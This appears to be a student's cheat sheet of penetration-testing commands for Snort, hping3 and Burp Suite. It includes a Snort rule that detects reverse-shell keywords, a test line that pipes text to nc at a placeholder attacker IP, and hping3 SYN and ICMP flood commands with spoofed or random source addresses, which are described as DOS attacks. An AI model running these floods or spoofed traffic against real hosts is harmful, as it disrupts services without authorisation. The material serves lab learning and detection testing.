	Penetration Testing tools and basic commands

	Snort
Tool used to detect DOS attacks.
start- sudo snort -A console -c /etc/snort/snort.conf
test- sudo snort -T -c /etc/snort/snort.conf
alter rules- cd /etc/snort/rules/local.rules
rules-
alert icmp any any -> $HOME_NET any(msg:"icmp";sid:10000001;rev:1)
alert tcp any any -> $HOME_NET 21(msg:"tcp";sid:100001;rev:1)
-A=activate,-T=test,-c=config
alert tcp any any -> $HOME_NET any(msg:"reverse shell,backdoor,suspicious exe,curl,wget,metspreter or HTTP execution has taken place";content:"nc /bin/bash wget curl .exe metapreter";nocase;sid:3000001;rev:1)
Here content-used to scan for specific kind of content and nocase means it is not case sensitive.
in the victim system run below command to trigger the rule
echo "nc /bin/bash wget curl .exe metapreter" | nc <attacker ip> <port>

	hping3
Tool used to send multiple syn packets and icmp packets for a DOS attack.

sudo hping3 -1 -c 100 -i 5 <ip>
sudo hping -1 -c 100 --faster <ip>
sudo hping -1 -a <fake ip> <ip>
sudo hping -1 --rand-source <ip>
syn packets for dos
sudo hping -S -c 1000 -p 80 <ip>
sudo hping -S --flood -p 80 <ip>
-S=syn, -1=icmp, -c=count, -a=alternate -p=port

	burpsuite
Burpsuite is a tool which intercepts the packets sent outside the system and it can be manuplated
In firefox->settings->proxy->manual set 127.0.0.1 and port 8080.
Go to http://burp->download the certificate
In firefox->settings->certificates->view certificates->authorization->input->(it will ask for certificate, choose the cert from the downloads)
Go to burpsuite click on proxy->intersept, and now u can intersept the packets sent.
Turn on the intersept before u send anything.
